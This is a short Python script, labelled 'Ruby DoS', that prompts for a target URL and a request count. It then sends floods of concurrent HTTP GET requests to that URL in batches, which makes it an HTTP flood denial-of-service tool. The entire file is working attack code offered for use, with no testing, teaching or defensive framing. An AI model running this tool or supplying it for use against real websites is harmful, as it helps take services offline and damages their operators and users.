import os
import aiohttp
import asyncio
from datetime import time
from datetime import datetime
from colorama import Fore
from utils.headers import initHeaders
import threading

def clear():
    if os.system('nt'):
        os.system("cls")
    else:
        os.system("clear")

def timewrap(function):
    def wrapper(*args):

        start = datetime.now()
        function(*args)
        end = datetime.now()

        print(Fore.YELLOW + "Done | Time: " + str(end-start) + Fore.RESET)
    return wrapper

async def make_request(url: str):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers=initHeaders(), proxy=None):
                print(f'{Fore.GREEN}Request for url {url} is completed | {datetime.now().strftime("%H:%M:%S:%f %d-%m-%Y")} {Fore.RESET}')
        except:
            print(Fore.RED + "Request for url " + url + " is not done" + Fore.RESET)


async def main(url: str, amount_of_requests: int, chunk_size: int):
    tasks = []
    done = 0
    try:
        for _ in range(amount_of_requests):
            tasks.append(asyncio.create_task(make_request(url)))
            done += 1
            if done == amount_of_requests or len(tasks) == chunk_size:
                await asyncio.gather(*tasks)
                tasks = []

    except Exception as ex:
        print("Something went wrong")
        print(ex)


@timewrap
def start_thread(url: str, amount_of_requests: int, chunk_size: int):
    asyncio.run(main(url, amount_of_requests, chunk_size))

if __name__ == '__main__':
    clear()
    print('''

    /\\
   /  \\
  /    \\
 /      \\
/        \\
\        /
 \      /
  \    /
   \  /
    \/
    \n''')
    print("Ruby DoS\n")
    url = input("Enter url for DoS attack: ")
    amount_of_requests = int(input("Enter amount of requests: "))
    chunk_size = int(input("Enter size of chunk: "))
    #thread = threading.Thread(target=start_thread, name=f'thread{t}', args= {url, chunk_size})
    start_thread(url, amount_of_requests, chunk_size)

